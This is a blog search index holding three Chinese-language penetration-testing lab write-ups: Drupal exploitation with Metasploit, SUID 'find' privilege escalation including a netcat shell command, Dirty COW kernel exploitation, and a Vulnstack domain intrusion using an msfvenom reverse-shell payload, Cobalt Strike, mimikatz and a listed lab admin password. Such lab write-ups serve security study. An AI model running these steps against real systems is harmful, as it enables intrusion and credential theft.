<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>Linux脏牛内核漏洞&amp;SUID提权</title>
      <link href="/2023/03/22/blog3/"/>
      <url>/2023/03/22/blog3/</url>
      
        <content type="html"><![CDATA[<p>信息搜集工具: LinEnum,linuxprivchecker<br>漏洞探针： linux-exploit-suggester linux-exploit-suggester2</p><h1 id="SUID提权"><a href="#SUID提权" class="headerlink" title="SUID提权"></a>SUID提权</h1><p>SUID (Set owner User ID up on execution) 是给予文件的一个特殊类型的文件权限。在 Linux&#x2F;Unix中，当一个程序运行的时候， 程序将从登录用户处继承权限。SUID被定义为给予一个用户临时的（程序&#x2F;文件）所有者的权限来运行一个程序&#x2F;文件。用户在执行程序&#x2F;文件&#x2F;命令的时候，将获取文件所有者的权限以及所有者的UID和GID。<br>若以下命令有suid权限，则可以进行suid提权</p><ul><li>Nmap</li><li>Vim</li><li>find</li><li>Bash</li><li>More</li><li>Less</li><li>Nano</li><li>cp</li></ul><h2 id="演示"><a href="#演示" class="headerlink" title="演示"></a>演示</h2><p>开启kail和靶机,扫描网段<br><img src="https://cdn.staticaly.com/gh/HackerZjYy/blogimg@main/Elevation%20of%20authority/1.png" alt="1"><br>发现靶机ip,对靶机进行端口扫描<br><img src="https://cdn.staticaly.com/gh/HackerZjYy/blogimg@main/Elevation%20of%20authority/2.png" alt="1"><br>访问80端口,知道是drupal搭建的<br><img src="https://cdn.staticaly.com/gh/HackerZjYy/blogimg@main/Elevation%20of%20authority/3.png" alt="1"><br>使用whatweb进行指纹扫描,得到drupal的版本是drupal 7<br><img src="https://cdn.staticaly.com/gh/HackerZjYy/blogimg@main/Elevation%20of%20authority/4.png" alt="1"><br>使用msfconsole,search drupal 中的模块进行攻击<br>search drupal<br>use 2<br>set rhost 192.168.222.131<br>run<br>拿到shell,但只是低权限，进行提权,上传LinEnum进行信息收集<br><img src="https://cdn.staticaly.com/gh/HackerZjYy/blogimg@main/Elevation%20of%20authority/5.png" alt="1"><br>可以看到存在一个可以利用的sudi漏洞–find<br><img src="https://cdn.staticaly.com/gh/HackerZjYy/blogimg@main/Elevation%20of%20authority/6.png" alt="1"><br>执行下面代码<br>touch test<br>find test -exec whoami ;<br>我们的权限已经升为root<br><img src="https://cdn.staticaly.com/gh/HackerZjYy/blogimg@main/Elevation%20of%20authority/7.png" alt="1"><br>也可以反弹到kail上<br>touch test<br>find test -exec nc -lvvp 3333 -e &#x2F;bin&#x2F;sh ;<br>成功反弹，权限为root<br><img src="https://cdn.staticaly.com/gh/HackerZjYy/blogimg@main/Elevation%20of%20authority/8.png" alt="1"></p><p>总结:SUID会以root的权限执行命令,这样就导致我们可以利用root权限来运行suid文件或命令，当我们运行文件或命令是就获得了root权限。<br>参考:<a href="https://pentestlab.blog/2017/09/25/suid-executables/">https://pentestlab.blog/2017/09/25/suid-executables/</a></p><h1 id="Linux脏牛内核提权"><a href="#Linux脏牛内核提权" class="headerlink" title="Linux脏牛内核提权"></a>Linux脏牛内核提权</h1><p>开启攻击机kail和靶机<br>扫描kail网端，确定靶机ip为192.168.222.130<br><img src="https://cdn.staticaly.com/gh/HackerZjYy/blogimg@main/Elevation%20of%20authority/9.png" alt="1"><br>扫描靶机端口，访问1898端口，发现是drupal框架<br><img src="https://cdn.staticaly.com/gh/HackerZjYy/blogimg@main/Elevation%20of%20authority/10.png" alt="1"><br><img src="https://cdn.staticaly.com/gh/HackerZjYy/blogimg@main/Elevation%20of%20authority/12.png" alt="1"><br>使用whatweb进行指纹扫描，发现drupal 7 版本<br><img src="https://cdn.staticaly.com/gh/HackerZjYy/blogimg@main/Elevation%20of%20authority/11.png" alt="1"><br>使用msfconsole进行攻击<br>search drupal<br>use  1<br>set rhost 192.168.222.130<br>set rport 1898<br>run<br><img src="https://cdn.staticaly.com/gh/HackerZjYy/blogimg@main/Elevation%20of%20authority/13.png" alt="1"><br>上传漏洞探针到靶机<br>upload &#x2F;tmp&#x2F;linux-exploit-suggester.sh  &#x2F;tmp&#x2F;1.sh<br>赋予权限，执行，发现有脏牛漏洞可以利用<br><img src="https://cdn.staticaly.com/gh/HackerZjYy/blogimg@main/Elevation%20of%20authority/14.png" alt="1"><br>下载脏牛漏洞exp，上传到靶机<br>searchsploit dirty<br>locate  linux&#x2F;local&#x2F;40847.cpp<br>cp &#x2F;usr&#x2F;share&#x2F;exploitdb&#x2F;exploits&#x2F;linux&#x2F;local&#x2F;40847.cpp &#x2F;tmp&#x2F;123.cpp<br>upload &#x2F;tmp&#x2F;123.cpp &#x2F;tmp&#x2F;123.cpp<br><img src="https://cdn.staticaly.com/gh/HackerZjYy/blogimg@main/Elevation%20of%20authority/17.png" alt="1"><br>将上传的c++文件编译为可执行文件<br>g++ -Wall -pedantic -O2 -std&#x3D;c++11 -pthread -o test 123.cpp -lutil<br>chomd 777 test<br>.&#x2F;test<br>利用python 开始交互式终端，输入密码拿到root 权限<br>python -c ‘import pty; pty.spawn(“&#x2F;bin&#x2F;bash”)’<br>su root<br><img src="https://cdn.staticaly.com/gh/HackerZjYy/blogimg@main/Elevation%20of%20authority/15.png" alt="1"><br>-Wall 一般使用该选项，允许发出GCC能够提供的所有有用的警告<br>-pedantic 允许发出ANSI&#x2F;ISO C标准所列出的所有警告<br>-O2编译器的优化选项的4个级别，-O0表示没有优化,-O1为缺省值，-O3优化级别最高<br>-std&#x3D;c++11就是用按C++2011标准来编译的<br>-pthread 在Linux中要用到多线程时，需要链接pthread库<br>-o dcow gcc生成的目标文件,名字为dcow<br>获得flag<br><img src="https://cdn.staticaly.com/gh/HackerZjYy/blogimg@main/Elevation%20of%20authority/16.png" alt="1"></p>]]></content>
      
      
      <categories>
          
          <category> 内网渗透 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>一次尝试</title>
      <link href="/2022/12/12/blog2/"/>
      <url>/2022/12/12/blog2/</url>
      
        <content type="html"><![CDATA[<h2 id="我不爱学习"><a href="#我不爱学习" class="headerlink" title="我不爱学习"></a>我不爱学习</h2>]]></content>
      
      
      <categories>
          
          <category> 内网渗透 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Vnlnstack(一)</title>
      <link href="/2022/12/11/blog/"/>
      <url>/2022/12/11/blog/</url>
      
        <content type="html"><![CDATA[<h1 id="已经拿到webshell-进入内网环境"><a href="#已经拿到webshell-进入内网环境" class="headerlink" title="已经拿到webshell,进入内网环境"></a>已经拿到webshell,进入内网环境</h1><p>首先攻击机为kail ip:192.168.121.128<br>域内主机:<br>win7 两张网卡 ip分别为:192.168.121.129<br>                      192.168.52.143<br>域控windows server 2008  ip:192.168.52.139  </p><h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><h3 id="msf提权"><a href="#msf提权" class="headerlink" title="msf提权"></a>msf提权</h3><ol><li><p>生成msf木马</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/meterpreter/reverse_tcp lhost=192.168.121.128 lport=4000 -f exe &gt; 123.exe</span><br></pre></td></tr></table></figure></li><li><p>将生成的木马通过webshell上传<br><img src="/image/vulnstack1/1.png" alt="1"></p></li><li><p>启动msf监听</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">use exploit/multi/handler</span><br><span class="line">set payload windows/meterpreter/reverse_tcp</span><br><span class="line">set lhost  192.168.121.128</span><br><span class="line">set lport  4000</span><br><span class="line"></span><br></pre></td></tr></table></figure></li><li><p>启动上传的木马<br><img src="/image/vulnstack1/2.png" alt="2"></p></li><li><p>这里可以看到我们已经监听成功了,并且提升到system权限<br><img src="/image/vulnstack1/3.png" alt="3"></p></li></ol><h3 id="cs提权"><a href="#cs提权" class="headerlink" title="cs提权"></a>cs提权</h3><ol><li><p>创建一个监听器<br><img src="/image/vulnstack1/4.png" alt="4"></p></li><li><p>利用cs生成一个木马<br><img src="/image/vulnstack1/5.png" alt="1"></p></li><li><p>将木马上传并启动</p></li><li><p>ok！cs这里已经上线一台<br><img src="/image/vulnstack1/6.png" alt="1"></p></li><li><p>提取。拿到system<br><img src="/image/vulnstack1/7.png" alt="1"><br><img src="/image/vulnstack1/8.png" alt="1"></p></li></ol><h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><p>信息收集命令(部分)</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">systeminfo 详细信息</span><br><span class="line">net start 启动服务</span><br><span class="line">tasklist 进程列表</span><br><span class="line">schtasks 计划任务</span><br><span class="line">ipconfig /all 判断存在域-dns</span><br><span class="line">net view /domain 判断存在域</span><br><span class="line">net time /domain 判断主域</span><br><span class="line">netstat -ano 当前网络端口开放</span><br><span class="line">nslookup 域名 追踪来源地址</span><br><span class="line">whoami /all 用户权限</span><br><span class="line">net config workstation 登录信息</span><br><span class="line">net user 本地用户</span><br><span class="line">net localgroup 本地用户组</span><br><span class="line">net user /domain 获取域用户信息</span><br><span class="line">net group /domain 获取域用户组信息</span><br><span class="line">wmic useraccount get /all 涉及域用户详细信息</span><br><span class="line">net group &quot;Domain Admins&quot; /domain 查询域管理员账户</span><br><span class="line">net group &quot;Enterprise Admins&quot; /domain 查询管理员用户组</span><br><span class="line">net group &quot;Domain Controllers&quot; /domain 查询域控制器</span><br><span class="line">nbtscan 192.168.3.0/24 第三方工具</span><br><span class="line">for /L %I in (1,1,254) DO @ping -w 1 -n 1 192.168.3.%I | findstr &quot;TTL=&quot; 自带内部命令</span><br><span class="line">nmap masscan 第三方 PowerShell 脚本 nishang empire 等</span><br><span class="line"></span><br></pre></td></tr></table></figure><ul><li><p>判断域是否存在<br><img src="/image/vulnstack1/9.png" alt="1"></p></li><li><p>查看端口信息<br><img src="/image/vulnstack1/10.png" alt="1"></p></li><li><p>查看本地用户<br><img src="/image/vulnstack1/11.png" alt="1"></p></li><li><p>查看本地用户组<br><img src="/image/vulnstack1/12.png" alt="1"></p></li><li><p>查询域控ip<br>可以使用ping 域控名字 来获得域控ip,但我这环境好像出问题了<br>使用for循环来ping主机<br><img src="/image/vulnstack1/13.png" alt="1"></p></li><li><p>进程信息<br><img src="/image/vulnstack1/14.png" alt="1"></p></li><li><p>利用cs上的mimikatz爆出明文密码和hash<br><img src="/image/vulnstack1/15.png" alt="1"></p></li></ul><p>利用信息收集到的信息我们知道了</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">域为god.org</span><br><span class="line">域控IP为192.168.52.138</span><br><span class="line">域管理员Administrator</span><br><span class="line">密码 Root12345</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="横向渗透"><a href="#横向渗透" class="headerlink" title="横向渗透"></a>横向渗透</h2><h3 id="利用cs完成横向移动"><a href="#利用cs完成横向移动" class="headerlink" title="利用cs完成横向移动"></a>利用cs完成横向移动</h3>]]></content>
      
      
      <categories>
          
          <category> 内网渗透 </category>
          
      </categories>
      
      
    </entry>
    
    
  
  
</search>
